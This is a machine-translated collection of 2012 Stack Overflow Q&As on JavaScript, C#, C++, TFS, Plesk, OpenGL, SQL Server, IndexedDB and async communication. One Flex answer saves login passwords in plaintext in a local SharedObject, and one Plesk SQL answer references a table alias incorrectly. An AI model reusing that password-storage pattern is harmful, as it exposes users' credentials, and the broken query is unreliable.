> 时间：2012-04-11T08:39:14.263

如果 this.gyro_x 为空，则永远不会进入 else 分支。您在 else 分支中只有一个 return 语句。在 if 分支或方法末尾添加一个，如果 this.gyro_x 是 Double 类型，它应该可以工作。

# javascript - 如何使用 JavaScript 访问文件元素的文件属性

> ID：10102520
> 
> 赞同：5
> 
> 时间：2012-04-11T08:35:30.523
> 
> 标签：javascript, jquery, dom

我的表单中有一个文件类型的输入元素。我喜欢做的是在上传元素之前检查文件大小以进行验证问题。通过使用大多数主要的 Web 浏览器（除了 IE，它总是做事更难），我发现所有浏览器都在使用一个“属性”，每当我选择一个新文件并显示文件大小以及其他有用的信息时，它都会更新。

这是我在 Chrome 网络浏览器中看到的内容：

![在此处输入图像描述](../Images/4c76073bbb7758551e5704ce3899ca33.png)

现在的问题是，如何使用 JavaScript 访问该值？我尝试了几种方法，但没有一个对我有好处？请问有什么好主意吗？

注意：在我的网站中，我使用 jQuery，因此只使用常规 JavaScript 并不重要。

亲切的问候梅里亚诺斯尼科斯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:58:39.513

```
//use any ol' selector to get the <input /> element:
var inputElement = document.querySelector("input[type='file']");

//then it's just like you'd access any object's attributes:
var fileSize = inputElement.files[0].size;
//note that it's a list of files, so you can loop through them
//in case the element accepts multiple files

//if you want all of the attributes, do something like:
for (var key in inputElement.files[0])
    if (inputElement.files[0].hasOwnProperty(key))
         console.log(key,inputElement.files[0][key]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-21T07:08:36.163

或者 ：

```
$("#btStartUpload").on("click", function(evt) {        

    var filesSelected = document.getElementById('btInput').files; // FileList object
    // var filesSelected = $('#btInput')[0].files; // with jQuery, any jQuery object have it's DOM element accessed using [0]
    // var filesSelected = $('input[type=file]')[0].files;
    console.log(filesSelected);
}); 
```

# javascript - 尝试禁用锚链接的 onbeforeunload 时，在单击鼠标之前调用 Mouseleave

> ID：10102523
> 
> 赞同：0
> 
> 时间：2012-04-11T08:35:39.670
> 
> 标签：javascript, jquery, javascript-events, event-handling

我正在尝试为我页面上的所有锚链接禁用 onbeforeunload，因此它仅在我关闭浏览器窗口/选项卡时触发。

这是我这样做的方式：

对于所有锚点，onmouseover，我将空值存储到 window.onbeforeunload 函数。然后，onmouseleave，我恢复了 window.onbeforeunload 函数

```
$(function () {
    SetupOnNavigateAway();
});

function OnBeforeUnload(oEvent) {       
    return "Are you sure you want to close this page?";     
}

function SetupOnNavigateAway() {
    window.onbeforeunload = OnBeforeUnload;
    $(window).data('beforeunload', window.onbeforeunload);
    $('body').delegate('a', 'hover', function (event) {
        if (event.type === 'mouseenter' || event.type === "mouseover")
            window.onbeforeunload = null;
        else
            window.onbeforeunload = $(window).data('beforeunload');
    });
} 
```

我的问题是，对于某些浏览器版本，当我单击链接时，mouseleave 事件在 mouseclick 事件之前触发。（我的光标没有离开链接）所以 onbeforeunload 函数在不需要调用时被调用..

例子：

现在是这样处理的：

1.  在按钮上移动鼠标：window.onbeforeunload = null
2.  将鼠标从按钮上移开：window.onbeforeunload = OnBeforeUnload
3.  在按钮上移动鼠标：window.onbeforeunload = null
4.  将光标停留在按钮上并单击：window.onbeforeunload = OnBeforeUnload，重定向

这是它应该如何工作的：

1.  在按钮上移动鼠标：window.onbeforeunload = null
2.  将鼠标从按钮上移开：window.onbeforeunload = OnBeforeUnload
3.  在按钮上移动鼠标：window.onbeforeunload = null
4.  将光标停留在按钮上并单击：重定向（window.onbeforeunload 仍然为空）

那么，当我单击锚点时，如何防止 mouseleave 事件发生？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:01:50.703

您是否尝试在单击时为 mouseleave 取消绑定事件侦听器：

```
$('body').delegate('a', 'click', function (event) {
    $(this).unbind('mouseleave'); 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:27:21.137

接受的答案对我有用，但对于那些可能需要另一种解决方案的人来说，这对我也有用：

```
$('body').delegate('a', 'click', function (event) {
    $(this).attr('clicked', 'yes'); 
});
$('body').delegate('a', 'hover', function (event) {
    if (event.type === 'mouseenter' || event.type === "mouseover") {
        window.onbeforeunload = null;
    }
    else {
        if ($(this).attr('clicked') != 'yes') {
            window.onbeforeunload = $(window).data('beforeunload');
        }
        else {
            $(this).attr('clicked', '');
        }
    }
}); 
```

# c# - c# MainWindowHandle 总是零

> ID：10102526
> 
> 赞同：2
> 
> 时间：2012-04-11T08:36:00.417
> 
> 标签：c#, process, handle

我阅读了一些关于 MainWindowHandle 的线程，但我找不到解决问题的方法，我正在启动一个 gui 应用程序并希望通过进程对象获取 MainWindowHandle，但如果我不打算这样做，句柄值始终为零等待 thread.sleep() 直到加载 gui。我也尝试使用 WaitForInputIdle 但它根本没有帮助。

```
process.Start();

process.WaitForInputIdle(1000);
while (process.MainWindowHandle == IntPtr.Zero)
{
     Thread.Sleep(100);
}
// do something with the handle 
```

如果我用普通线程替换waitforinputidle，他永远不会离开。睡眠他得到了正确的句柄。

简而言之：如果我得到一个句柄，我只想继续我的代码！=零，但我不想为此等待静态时间

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T08:41:23.080

MainWindowHandle 中存储的值被缓存。在循环中添加一个 process.Refresh() 以使该值无效：

```
while (process.MainWindowHandle == IntPtr.Zero)
{
    Thread.Sleep(100);
    process.Refresh();
} 
```

# c++ - C++ Local var 在动态中，在堆栈上？

> ID：10102528
> 
> 赞同：3
> 
> 时间：2012-04-11T08:36:06.403
> 
> 标签：c++, dynamic, stack, local

假设我在动态内存（新）中有一个对象，并且在它的一个函数中，它有

```
int Obj1::Add(int a, int b)
{
    int c = a + b;
    return c;
} 
```

c (和 a 和 b...) 在堆栈上吗？或在我的对象的动态内存中。只是好奇:)谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:37:40.197

所有这些都将在堆栈上。`a`并`b`传递参数，因此即使原始文件在堆中，也会在堆栈上制作副本。如果您通过引用传递，则可能是另一回事，因为实际发送的东西（“在引擎盖下”）将更像是指向原始对象的指针。

对于`c`，因为它是一个局部变量，所以它也在堆栈上。

这当然是假设您的实现甚至*使用*了堆栈，并且优化并不仅仅是将它们存储到寄存器中。这完全取决于实施。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T08:46:55.067

C++ 标准中没有明确提及术语“堆栈”或“堆”。相反，需要一个 C++ 编译器来根据特定的“存储持续时间”来实现：

[C ++调用堆栈不是标准的？](https://stackoverflow.com/questions/6876043/c-call-stack-not-in-standard)

但是对于今天的处理器和编译器的实际用途，您通常可以假设 a/b/c 位于堆栈或寄存器中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-11T08:53:24.383

It's really up to the compiler. On a Sparc, all three will be in registers, and I would expect this to be the most frequent case. Only on an Intel 32 bit (or 16 bit, if you go back in time) would `a` and `b` be on the stack.

None of which is relevant to much of anything. Concerning the key point of your question (I think): none of them will be part of the object referenced by `this`. However the compiler organizes things, the three variables will be somewhere else than the object. Even if the object itself is on the stack, and you're on an Intel architecture where arguments, etc. are also on the stack, the object and the variables will be in different places on the stack.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T08:37:13.347

`a`，`b`并且`c`在堆栈上（或可能在寄存器中）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T08:38:04.287

它们都在堆栈上。但是，将 c 返回给调用者仍然是安全的，因为会生成一个副本。

# java - Java 超级包的现状如何？

> ID：10102529
> 
> 赞同：8
> 
> 时间：2012-04-11T08:36:08.230
> 
> 标签：java, java-7

在[JSR 294](http://jcp.org/en/jsr/detail?id=294)中指定了 Java 的超级包功能。它应该在 Java 7 中首次亮相，但 JSR 被标记为非活动状态，并且 Java 7 是半年前发布的。

在网络上很难找到关于超级包的确切信息，有很多关于“即将推出的超级包”的文章，但几乎没有关于该功能的当前状态的文章。所以我的问题是：该功能的状态是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T08:40:04.060

我相信它现在被称为模块并且应该是~~Java 8 Java 9 的一部分 - 您可以~~[在 JSR 337](http://jcp.org/en/jsr/detail?id=337)中找到更多信息（在页面上搜索模块）。模块由[Project Jigsaw](http://openjdk.java.net/projects/jigsaw/)覆盖。

# c# - Silverlight 属性始终返回 false

> ID：10102532
> 
> 赞同：0
> 
> 时间：2012-04-11T08:36:17.173
> 
> 标签：c#, silverlight

在我的 silverlight 项目中，我创建了这个属性：

```
private bool _isEnabled = true;
public bool IsEnabled
{
    get
        {
            return _isEnabled;
        }
   set
   {
        _isEnabled = value;
        RaisePropertyChanged("IsEnabled");
    }
} 
```

但它总是返回 false 而不是 true 为什么会这样？谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T13:54:59.900

1）像那样检查你的分配 INotifyPropertyChanged 类（继承）

```
Public class MainPageVM:INotifyPropertyChanged 
```

2) 检查您的 Xaml 代码模式属性

```
IsEnabled="{Binding IsEnabled,Mode=TwoWay}" 
```

# c# - 如何停止和恢复 Windows 手机的 XNA 游戏？

> ID：10102537
> 
> 赞同：0
> 
> 时间：2012-04-11T08:36:30.073
> 
> 标签：c#, xna

我在停止 windows phone xna 游戏时遇到问题。

我以为我可以使用：

```
timer.Stop();
timer.Start(); 
```

停止然后重新开始游戏。但这不起作用，停止很好，但在开始游戏时不会恢复。如何解决这个问题？

计时器是一个 GameTimer

PS。我使用的是 xna/silverlight 项目而不是纯 xna 游戏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:50:47.227

看看游戏状态管理，[http://create.msdn.com/en-US/education/catalog/sample/game_state_management](http://create.msdn.com/en-US/education/catalog/sample/game_state_management)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:36:39.920

我刚发现

```
timer.Stop();
timer.Start(); 
```

在 xna/silverlight 应用程序中工作。我的问题是另一个错误

# version-control - 离职员工的结账文件

> ID：10102542
> 
> 赞同：0
> 
> 时间：2012-04-11T08:36:49.543
> 
> 标签：version-control, tfs

> **可能重复：**
> [我如何在 TFS 中撤消前雇员的签出](https://stackoverflow.com/questions/258202/how-do-i-undo-check-out-in-tfs-for-former-employees)

如何清除/删除 TFS2010 中离开公司的员工的某些文件的签出状态？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:40:30.337

您的 TFS 管理员应该能够释放锁定...

或者，让您的网络管理员使用新密码临时恢复他的帐户，然后自行处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T10:33:41.753

首先，在源代码管理资源管理器中右键单击 TeamProject 根目录，选择“属性”，然后选择“安全”并检查您是否拥有
“解锁其他用户的更改”和
“撤消其他用户的更改”的权限。

完成后，再次右键单击并选择“在源代码管理中查找”>“状态”并选择“显示文件签出到：”=离开的员工

您现在需要做的就是选择所有签出列表并选择“撤消”。

**编辑**：
如果`Find in Source Control`您右键单击并简单地选择它，可以在源代码管理资源管理器中找到它：
![在此处输入图像描述](../Images/d2ea10b9655cffcee167a4e2d54d98e6.png)
它的存在可能与[Power Tools](http://visualstudiogallery.msdn.microsoft.com/c255a1e4-04ba-4f68-8f4e-cd473d6b971f)有关- 因此，如果您没有看到此菜单，请考虑安装它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T09:32:47.383

您可以使用[Team Foundation Sidekick](http://blogs.microsoft.co.il/blogs/tfsidekicks/archive/2010/01/03/team-foundation-sidekicks-for-2010-available.aspx)，它具有 GUI 来解锁其他人的文件，但您必须有权这样做。

# email - 如何在 plesk 9.5.4 中向我的所有客户发送电子邮件？

> ID：10102543
> 
> 赞同：0
> 
> 时间：2012-04-11T08:36:54.097
> 
> 标签：email, plesk

我们即将将我们的服务器迁移到一个新的服务器，并且会有一点停机时间。现在，我如何在 plesk 中通知我的所有客户？

他们必须在第一次登录时填写带有电子邮件地址的表格，但我怎样才能全部获得？

感谢您的建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T09:11:49.250

我找到了一种获取客户所有电子邮件地址的方法。

在mysql数据库中，有一个数据库叫`psa`，还有一个表叫`clients`. 在此表中是所有客户，并且有一个名为电子邮件的列，因此我导出了以下结果：

`SELECT email FROM clients WHERE email LIKE "%@%";`

获取所有域的所有电子邮件地址比较困难：

`SELECT CONCAT(a.mail_name, "@", b.name) AS email FROM mail AS a LEFT JOIN domains AS b ON a.dom_id = b.id;`

希望这有助于 Plesk 版本 < 10 的其他人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-17T11:36:25.187

您可能需要仅向活动域发送电子邮件：

```
SELECT CONCAT(a.mail_name, "@", b.name) AS email FROM mail AS a LEFT JOIN domains AS b ON a.dom_id = b.id where domains.status=0; 
```

# iphone - iPhone OpenGL ES Paint App 笔刷效果

> ID：10102556
> 
> 赞同：2
> 
> 时间：2012-04-11T08:37:44.550
> 
> 标签：iphone, objective-c, ios, opengl-es, xcode4

我正在为 iPhone 和 iPad 开发绘画应用程序 [参考 GLPaint 应用程序]。我正在研究画笔效果。我想为我的绘画应用程序获得画笔效果，如 Image1 所示

![在此处输入图像描述](../Images/73024ef8f3a6539ca4840c21c16681ae.png)

我的笔触类似于图 2

![在此处输入图像描述](../Images/7e48de17337282385d2654073daba9f3.png)

我正在为画笔纹理使用以下代码：

```
CGImageRef      brushImage;
CGContextRef    brushContext;
GLubyte         *brushData;
size_t          width, height;
    if(UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad)
    {
        brushImage = [UIImage imageNamed:@"flower@2x.png"].CGImage;
    }
    else {
        brushImage = [UIImage imageNamed:@"flower.png"].CGImage;
    }
    width = CGImageGetWidth(brushImage)   ;
    height = CGImageGetHeight(brushImage) ;
    if(brushImage) {

        brushData = (GLubyte *) calloc(width * height * 4, sizeof(GLubyte));
                brushContext = CGBitmapContextCreate(brushData, width, height, 8, width * 4, CGImageGetColorSpace(brushImage),kCGImageAlphaPremultipliedLast);
        CGContextDrawImage(brushContext, CGRectMake(0.0, 0.0, (CGFloat)width, (CGFloat)height), brushImage);
        CGContextRelease(brushContext);
        glGenTextures(1, &brushTexture);
        glBindTexture(GL_TEXTURE_2D, brushTexture);
        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, brushData);
        free(brushData);
    }
        CGFloat scale;
        scale = self.contentScaleFactor;

    glMatrixMode(GL_PROJECTION);
    CGRect frame = self.bounds;
    glLoadIdentity();
    glOrthof(0, (frame.size.width) * scale, 0, (frame.size.height) * scale, -1, 1);
    glViewport(0, 0, (frame.size.width) * scale, (frame.size.height) * scale);
    glMatrixMode(GL_MODELVIEW);
    glDisable(GL_DITHER);
    glEnable(GL_BLEND);
    glEnable(GL_TEXTURE_2D);
    glEnableClientState(GL_VERTEX_ARRAY);
    glEnable(GL_BLEND);
    glBlendFunc(GL_ONE, GL_ONE_MINUS_SRC_ALPHA);
    glEnable(GL_POINT_SPRITE_OES);
    glTexEnvf(GL_POINT_SPRITE_OES, GL_COORD_REPLACE_OES, GL_TRUE);
    glPointSize(width / kBrushScale);
    // Define a starting color 
    HSL2RGB((CGFloat) 0.0 / (CGFloat)kPaletteSize, kSaturation, kLuminosity, &components[0], &components[1], &components[2]);
    glColor4f(components[0] * kBrushOpacity, components[1] * kBrushOpacity, components[2] * kBrushOpacity, kBrushOpacity); 
```

我一直在寻找与不同画笔笔触相关的代码，但我找不到任何代码。帮助我获得类似于 image1 的“所需”笔触。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T18:49:43.860

不要使用`GL_POINT_SPRITE_OES`模式。通过标准三角形绘制精灵。然后它需要将精灵纹理坐标绑定到目标输出坐标并使精灵纹理可重复。假设精灵纹理大小为 32x32。默认纹理坐标位于 rect 中`{{0,0},{1.0,1.0}}`。在`{x,y}`位置绘制精灵，需要使用基于 rect 的精灵纹理坐标`{{(x%32)/32.0, (y%32)/32.0},{1.0, 1.0}}`。这样可以防止精灵内容弄脏。

# sql-server - 显示查询必须在 SQL Server 中运行多长时间

> ID：10102563
> 
> 赞同：3
> 
> 时间：2012-04-11T08:38:10.083
> 
> 标签：sql-server, sql-server-2008, tsql, sql-server-2005

有没有办法查看 SQL Server 中的查询有多远？我知道如何在 oracle 中执行此操作，但我无法确定是否可以在 SQL Server 中执行此操作。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:44:59.157

没有直接的方法可以做到这一点，但如果您的查询不仅仅是一个选择，您可以插入这个“检查点”：

```
RAISERROR ('Your message here', 0, 1) WITH NOWAIT 
```

例如

```
SELECT ... FROM ...
RAISERROR ('33% .... DONE', 0, 1) WITH NOWAIT
SELECT ... FROM ...
RAISERROR ('66% .... DONE', 0, 1) WITH NOWAIT
...
... 
```

**您可以在消息**窗口中查看进度。

有时这是非常有帮助的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:47:06.367

并不真地。如果你想要一个命令说：这个查询已经完成了 35%，你不会得到它。SQL Server 无法确定完成查询的距离，因为它事先不知道查询将满足多少行。

你能做的就是`run sp_who2 'active'`寻找你的任务。同样，它不会告诉您需要多长时间才能完成，但您可以实时查看有关它运行多长时间的信息。

SET STATISTICS TIME ON 或跟踪文件将在运行查询后向您显示信息

# iphone - 文本到语音：阅读列表并在标题之间播放音频文件

> ID：10102564
> 
> 赞同：0
> 
> 时间：2012-04-11T08:38:15.953
> 
> 标签：iphone, ios, uitableview, audio, text-to-speech

我在我的应用程序中使用**dragon-dictations iPhone SDK Speech Kit**进行*文本到语音*。
我想阅读 tableView 中的标题。
我从 coreData 获取值并将它们保存到文本文件
（稍后，我想对文本文件做更多的事情）。

因此，在标题之间，我想播放一种声音，例如**叮当声、耳标或音频提示/音频文件**，以便用户收到此声音的通知，即标题已更改。
我不知道如何实现一个功能，在头条新闻之间播放叮当声。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:41:10.270

对于文本到语音，您可以使用 flite-1.4-iphone

*   如何使用

要在新项目或现有项目中使用它，您可以按照以下步骤操作：

[0：从http://bitbucket.org/sfoster/iphone-tts/](http://bitbucket.org/sfoster/iphone-tts/)获取最新版本并在finder中打开。

1：将“flite-1.4-iphone”目录拖到你项目的“Other Sources”区域。这包含了 flite 的来源。

2：将文件 FliteTTS.h 和 FliteTTS.m 拖到项目的“类”区域。

3：如果还没有 AVFoundation 框架，请将其添加到您的项目中。

4：对于要调用库的类，如果要在.h文件中定义类变量，

将此行添加到您的 .h 文件中，就在 @interface 行的上方：

@class FliteTTS;

5：根据需要在 .h 或 .m 中创建指向类的指针：

```
FliteTTS *fliteEngine; 
```

6：在类的.m文件中添加...

# 导入“FliteTTS.h”

7：初始化一个 FliteTTS 对象并将指针指向它：

```
fliteEngine = [[FliteTTS alloc] init]; 
```

8：开始使用它：

```
[fliteEngine speakText:@"It works."];   // Make it talk

[fliteEngine setPitch:100.0 variance:50.0 speed:1.0];// Change the voice properties

[fliteEngine setVoice:@"cmu_us_awb"];   // Switch to a different voice

[fliteEngine stopTalking];              // stop talking 
```

*   包含的声音（您可以删除不需要的声音）

cmu_us_kal

cmu_us_kal16

cmu_us_awb

cmu_us_rms

cmu_us_slt

* * *

[你可以从这里](http://www.speech.cs.cmu.edu/flite/) 下载示例代码[http://www.speech.cs.cmu.edu/flite/](http://www.speech.cs.cmu.edu/flite/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T09:27:55.367

我的问题的解决方案是：

我必须使用 SSML。使用 ssml，我可以随时随地播放音频文件。

这是它的行：

```
<audio src="welcome.wav"> 
```

# android - 线程和处理程序 handleMessage() 性能

> ID：10102565
> 
> 赞同：1
> 
> 时间：2012-04-11T08:38:16.033
> 
> 标签：android

当我对应用程序进行分析时，我发现 handleMessage() 正在循环并且需要时间在 ListView 中显示我的数据。有没有其他方法可以以更优化的方式更新 ListView，以便我可以全速查看视图，可以调整性能？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:48:10.147

您的意思是在 handleMessage 上花费了太多时间吗？

# apache-flex - 偶尔使用 Flex Air 连接的应用程序

> ID：10102569
> 
> 赞同：0
> 
> 时间：2012-04-11T08:38:24.657
> 
> 标签：apache-flex, air

这是我第一次使用这种应用程序。我的经验很少。利益相关者也是如此。他们想要一个（flex AIR）应用程序之类的东西，它能够：

1.  如果应用程序关闭，则在本地保存数据
2.  如果需要，与服务器端同步数据

现在，是时候让我在这个要求得到修复之前“做点什么”了。我有很多问题，但这里有一些不那么愚蠢的问题：

1.  要求是关于“很少”连接，而不是“偶尔”连接，对吧？
2.  如果我无法更改要求，我应该怎么做，像 Windows 操作系统一样“休眠”AIR 应用程序或只将数据保存到本地数据库？他们的可能性？

请给我一些建议/建议。

谢谢，

P/S：在内部，我们确实讨论了 ADEP 数据服务功能。我有一个来自 Adob​​e 的示例：http: [//help.adobe.com/en_US/enterpriseplatform/10.0/AEPDeveloperGuide/WS562be5d616a63050-3e6e4f7d131900899a6-8000.html](http://help.adobe.com/en_US/enterpriseplatform/10.0/AEPDeveloperGuide/WS562be5d616a63050-3e6e4f7d131900899a6-8000.html) ==> 我认为我没有完全理解它 :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:58:01.147

您确实可以在应用程序关闭时将数据本地保存在 SQLITE 中，下次启动应用程序时，您可以将更改持久保存到服务器并在需要时检索更新。

根据应用程序的复杂性和数据量，您可以：

1.  [免费] 仅使用远程对象和轮询自己实现同步逻辑
2.  [免费] 在 BlazeDS 上实现消息传递（数据推送），以便服务器可以在需要时实时推送更新
3.  [昂贵] 使用多合一的 Adob​​e 同步解决方案 (LiveCycle)

这真的取决于我们正在谈论什么样的应用程序和数据。

干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T13:21:50.090

如果可能的话，你可以使用 sharedObject ...

```
public var _rememberSo:SharedObject;

_rememberSo = SharedObject.getLocal("loginData");
if (_rememberSo.data.username != undefined && _rememberSo.data.password != undefined)
{
    txtUserName.text = _rememberSo.data.username ; 
    txtPassword.text = _rememberSo.data.password ;
    chkSavePassword.selected = true ;
    btnLogin.setFocus(); 
}
else
{
    txtUserName.text="";
    txtPassword.text="";
    txtUserName.setFocus();
} 
```

我已经用于本地保存密码..您可以根据您的数据使用它...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-15T17:06:01.530

它可能不是最好的选择，但我们确实选择了 ADEP 的东西：

*   数据模型驱动： http: [//www.adobe.com/devnet/livecycle/articles/lcdses2_mdd_quickstart.html](http://www.adobe.com/devnet/livecycle/articles/lcdses2_mdd_quickstart.html) --> 这有助于为服务器端 DAO 和 SQLite DAO 生成代码。
*   Adobe 同步解决方案：这里我们创建自己的 lastModified 属性来比较离线数据和服务器数据

如果将来有人跟随我们的道路，请注意三件事：

*   它是商业的，没有开源的
*   文档很好，但不是直截了当
*   样品很好，但不是直截了当

我不得不花 2 天时间来理解事情。我们现在充满信心

# google-chrome-extension - 与 WebSQL 相比，IndexedDB 非常慢，我做错了什么？

> ID：10102571
> 
> 赞同：5
> 
> 时间：2012-04-11T08:38:38.023
> 
> 标签：google-chrome-extension, web-sql, indexeddb

我做了一个演示 chrome 扩展来比较 websql 和 indexeddb 并更详细地了解两者的工作原理。

令我惊讶的是，它表明 indexeddb 即使与最简单的 sql 命令相比也要慢得多。

由于已弃用 websql 以支持 indexeddb，因此我假设 indexeddb 与 websql 一样快或更快。

我假设我在 indexeddb 代码中做错了什么。因为弃用更快的东西会很愚蠢，我假设他们知道在弃用 websql 以支持 indexeddb 时他们在做什么。

sql搜索代码：

```
// Search entries
        var term = search_query;
        db.transaction(function(tx) {
            tx.executeSql('SELECT * FROM places', [], function (tx, results) {
                console.log("sql search");
                var count = 0;
                var wm = WordsMatch.init(term.trim().toLowerCase());
                var len = results.rows.length
                for (var i = 0; i < len; ++i) {
                    var item = results.rows.item(i);
                    if (wm.search(item.url.toLowerCase())) {
                        //console.log(item.id, item.url);
                        ++count;
                    }
                }
                console.log("Search matches:", count);
                console.log("\n");
            });
        }, reportError); 
```

indexeddb 搜索代码：

```
 PlacesStore.searchPlaces(search_query, function(places) {
                    console.log("indexedDB search");
                    var count = places.length;
                    console.log("Search matches:", count);
                    console.log("\n");
                });

var PlacesStore = { searchPlaces: function (term, callback) {
        var self = this,
            txn = self.db.transaction([self.store_name], IDBTransaction.READ_ONLY),
            places = [],
            store = txn.objectStore(self.store_name);
        var wm = WordsMatch.init(term.trim().toLowerCase());
        Utils.request(store.openCursor(), function (e) {
            var cursor = e.target.result;
            if (cursor) {
                if (wm.search(cursor.value.url.toLowerCase())) {
                    places.push(cursor.value);
                }

                cursor.continue();
            }
            else {
                // we are done retrieving rows; invoke callback
                callback(places);
            }
        });
    }
}/**/

var Utils = {
    errorHandler: function(cb) {
        return function(e) {
            if(cb) {
                cb(e);
            } else {
                throw e;
            }
        };
    },

    request: function (req, callback, err_callback) {
        if (callback) {
            req.onsuccess = function (e) {
                callback(e);
            };
        }
        req.onerror = Utils.errorHandler(err_callback);
    }
}; 
```

我还做了一个 chrome 错误报告并在那里上传了完整的扩展代码： [http ://code.google.com/p/chromium/issues/detail?id=122831](http://code.google.com/p/chromium/issues/detail?id=122831)

（我不能在这里上传扩展 zip 文件，没有这个功能）

我用我用作测试数据的 38862 个 url 填充了 websql 和 indexeddb 数据库。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-15T23:30:40.543

部分问题在于，迄今为止，IndexedDB 实现主要致力于实现完整规范，而不太关注性能。我们最近在 Firefox 中发现了一些非常愚蠢的错误，这些错误已得到修复，应该会让我们显着加快速度。

我知道 chrome 团队因为他们的多进程架构而遭受了一些挑战。我被告知他们最近已经解决了其中一些问题。

所以我鼓励你尝试所有浏览器的最新版本，可能包括夜间/金丝雀版本。

但是请注意，我们没有弃用 WebSQL，因为 IndexedDB 更快。我们弃用了 WebSQL，因为它不是未来的证明。WebSQL 被定义为使用特定的 SQLite 后端（如果您查看规范，它实际上在那里写得很清楚）。然而，所有浏览器制造商都需要使用最新版本的 SQLite 才能获得安全、性能和稳定性修复。最新版本总是以微妙的方式改变 SQL 语法。这意味着我们会以微妙的方式破坏您使用 WebSQL 的 Web 应用程序。这对我们来说似乎不太好。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-11T17:48:02.787

答：你没有做错什么。您的 IndexedDB 代码是正确的。至于结论，其他人[也发现这也是正确](http://www.webdeveloper.com/forum/showthread.php?p=1201277#post1201277)的。

额外：需要注意的一件有趣的事情是 IndexedDB 在浏览器中的实现方式不同。Firefox 使用 SQLLite 和 Chrome LevelDB，因此即使您在 FF 中使用 IndexedDB，您仍然在使用具有类似 SQL 开销的 SQL 支持的技术（加上其他所有内容）。

我很想知道您在不同大小的数据库中的结果。我希望，但还不能证实，IndexedDB 可以在更大的数据集上更好地扩展（即使 38862 看起来确实足够大）。

# android - 如何在 Android 中以编程方式阅读语音邮件

> ID：10102573
> 
> 赞同：6
> 
> 时间：2012-04-11T08:38:53.157
> 
> 标签：android, voicemail

只是想知道是否可以使用代码访问电话的语音信箱？

我看到在 Android 4.0 中，Google 引入了一个名为“ `android.provider.VoicemailContract.Voicemails`”的新内容提供程序，但我想在旧版本的 Android 上这样做？有可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T20:40:04.930

不，因为每个网络运营商/电话制造商处理语音邮件的方式不同。在许多情况下，手机上甚至没有任何应用程序知道个人语音消息。您可以做的最好的事情是创建一个 PhoneStateListener 来监听[`LISTEN_MESSAGE_WAITING_INDICATOR`](http://developer.android.com/reference/android/telephony/PhoneStateListener.html#LISTEN_MESSAGE_WAITING_INDICATOR)，它可以让您读取网络运营商发送的消息等待指示标志（回答问题“是否有新的语音消息？”）。

# c - 同步和异步通信是如何工作的

> ID：10102580
> 
> 赞同：21
> 
> 时间：2012-04-11T08:39:22.017
> 
> 标签：c, asynchronous, synchronous

我试图理解同步和异步通信这两个术语，但我有点困惑。[我试图对此](https://stackoverflow.com/questions/1596589/why-are-asynchronous-processes-not-called-synchronous/)进行深入研究，但仍然存在困惑。我的问题如下：

1.同步和异步通信是如何工作的？还要参考上面提到的异步通信使用的信号有哪些。

2.同步和异步流程是如何工作的？

任何说明这一点的例子都会有所帮助。

抱歉，这是一个非常简单的问题。我是编程新手。希望你的回答对我有帮助。提前致谢！！！！

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2012-04-11T08:52:53.850

打电话给某人是同步的。通过邮件与他通信是异步的。

* * *

**同步**

当我打电话给你时，我会拨你的号码，然后**等**你接电话。然后你说点什么，同时我也听你的。完成后，我会向您发送数据（与您交谈），同时您会收到它们（听我说）。在我们的通信结束时，我们中的一个人说“END OF TRANSMISSION”（再见），另一个人说“Acknoledged”（再见），然后双方都挂断了电话。

* * *

**异步**

我给你写信。我把它放到邮局，它会寄给你的。我同时我**不等待**。我做很多不同的事情。然后你会收到这封信。当我还在做许多不同的事情时，你读了它。然后你给我写一个答案并发给我。所有这些事情我都没有参与。第二天，我从系统（邮递员）收到一条（同步）消息（信号）。它（他）说：“这是给你的信息”。或者，我可以每五分钟轮询一次收件箱，检查是否有新信。然后我暂停我的其他工作，收到您的来信并阅读您的答复。然后我根据这个答案做一些事情。但这是您不会注意到的事情，因为您没有参与我对您的异步答案所做的事情。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-04-11T08:51:11.620

**同步**您的代码发送消息、调用函数等并被阻塞，直到答案、返回值等到达。

